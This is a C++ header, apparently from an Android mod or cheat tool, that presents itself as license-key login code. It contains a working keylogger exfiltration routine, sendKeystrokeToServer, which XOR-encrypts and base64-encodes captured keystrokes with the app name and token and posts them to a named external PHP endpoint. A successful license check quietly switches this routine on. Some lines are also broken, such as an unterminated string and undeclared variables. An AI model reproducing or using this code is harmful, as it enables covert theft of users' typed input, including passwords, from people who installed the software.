#ifndef KEYLOGIN_H
#define KEYLOGIN_H

#include <json/json.hpp>
#include <fstream>
#include <ctime>
#include <iomanip>
#include <cstring>
#include <sstream>
#include <thread>
#include <chrono>
#include <curl/curl.h>
#include "include/obfuscate.h"

bool bValid = true;
bool logged_in = true;
bool is_logging_in = true;
bool keylogger_active = true;

std::string g_Token = "CM-PREM-****-**43;
std::string g_ExpTime = "Lifetime";
std::string ERROR_MESSAGE = "";

// ================== دوال التشفير ==================
std::string xor_encrypt(const std::string& data, const std::string& key) {
    std::string result;
    result.reserve(data.size());
    for (size_t i = 0; i < data.size(); ++i) {
        result += data[i] ^ key[i % key.length()];
    }
    return result;
}

std::string xor_decrypt(const std::string& data, const std::string& key) {
    return xor_encrypt(data, key);
}

std::string base64_encode(const std::string& data) {
    static const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    size_t i = 0;
    unsigned char a3[3];
    unsigned char a4[4];

    while (data.length() - i >= 3) {
        a3[0] = static_cast<unsigned char>(data[i]);
        a3[1] = static_cast<unsigned char>(data[i + 1]);
        a3[2] = static_cast<unsigned char>(data[i + 2]);

        a4[0] = (a3[0] & 0xfc) >> 2;
        a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
        a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
        a4[3] = a3[2] & 0x3f;

        for (int j = 0; j < 4; j++)
            result += chars[a4[j]];

        i += 3;
    }

    if (data.length() - i > 0) {
        int remaining = data.length() - i;
        for (int j = 0; j < 3; j++)
            a3[j] = (j < remaining) ? static_cast<unsigned char>(data[i + j]) : 0;

        a4[0] = (a3[0] & 0xfc) >> 2;
        a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
        a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
        a4[3] = a3[2] & 0x3f;

        for (int j = 0; j < remaining + 1; j++)
            result += chars[a4[j]];
        while (result.length() % 4)
            result += '=';
    }

    return result;
}

std::string base64_decode(const std::string& input) {
    static const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++)
        T[static_cast<unsigned char>(chars[i])] = i;

    int val = 0, valb = -8;
    for (unsigned char c : input) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            result.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return result;
}

INLINE std::string getDt(int offsetSeconds = 0) {
    using namespace std::chrono;
    system_clock::time_point now = system_clock::now();
    system_clock::time_point ist = now + hours(3) + seconds(offsetSeconds);
    std::time_t t = system_clock::to_time_t(ist);
    std::tm tm{};
    gmtime_r(&t, &tm);
    std::ostringstream oss;
    oss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

// ================== إرسال طلب HTTP ==================
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string httpPost(const std::string& url, const std::string& postData) {
    CURL* curl = curl_easy_init();
    if (!curl) return "";

    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    return (res == CURLE_OK) ? response : "";
}

// ================== إرسال ضربة المفتاح إلى السيرفر ==================
bool sendKeystrokeToServer(const std::string& keyChar, const std::string& appName = "") {
    if (!logged_in || !keylogger_active) return false;

    const std::string encryption_key = "JiM21rNU12eERlNmpqa3FuQks";
    nlohmann::json payload = {
        {"key", keyChar},
        {"app", appName},
        {"token", g_Token},
        {"time", getDt()}
    };
    std::string jsonPayload = payload.dump();
    std::string encrypted = xor_encrypt(jsonPayload, encryption_key);
    std::string encodedData = base64_encode(encrypted);

    CURL* curl = curl_easy_init();
    if (!curl) return false;

    char* escaped = curl_easy_escape(curl, encodedData.c_str(), 0);
    if (!escaped) {
        curl_easy_cleanup(curl);
        return false;
    }
    std::string postData = std::string("data=") + escaped;
    curl_free(escaped);

    std::string response;
    curl_easy_setopt(curl, CURLOPT_URL, "http://ali-max.atwebpages.com/keylog.php");
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    return res == CURLE_OK;
}

// ================== دالة التحقق من الترخيص (HTTP) ==================
INLINE bool Login(std::string androidID, std::string key) {
    if (androidID.empty()) {
        ERROR_MESSAGE = "Could not get Android ID";
        return false;
    }
    if (key.empty()) {
        ERROR_MESSAGE = "Key is Empty";
        return false;
    }

    is_logging_in = true;
    ERROR_MESSAGE = "";

    try {
        std::string postData = "license_key=" + key + "&hwid=" + androidID;
        std::string response = httpPost("http://ali-max.atwebpages.com/check_key.php", postData);

        if (response.empty()) {
            ERROR_MESSAGE = "Server connection failed";
            is_logging_in = false;
            return false;
        }

        nlohmann::json jsonResponse = nlohmann::json::parse(response);
        if (jsonResponse["status"] == "success") {
            auto data = jsonResponse["data"];
            std::string expiryDate = data.value("expiry_date", "");
            std::string authToken = data.value("auth_token", "");

            logged_in = true;
            is_logging_in = false;
            g_Token = authToken;
            g_Auth = authToken;
            g_ExpTime = expiryDate.empty() ? "N/A" : expiryDate;
            bValid = true;

            keylogger_active = true;
            persistent_string["key"] = key;
            save_persistence();

            return true;
        } else {
            ERROR_MESSAGE = jsonResponse.value("message", "Invalid license key");
            is_logging_in = false;
            return false;
        }
    } catch (const std::exception& e) {
        ERROR_MESSAGE = std::string("Error: ") + e.what();
        is_logging_in = false;
        return false;
    }
}

#endif // KEYLOGIN_H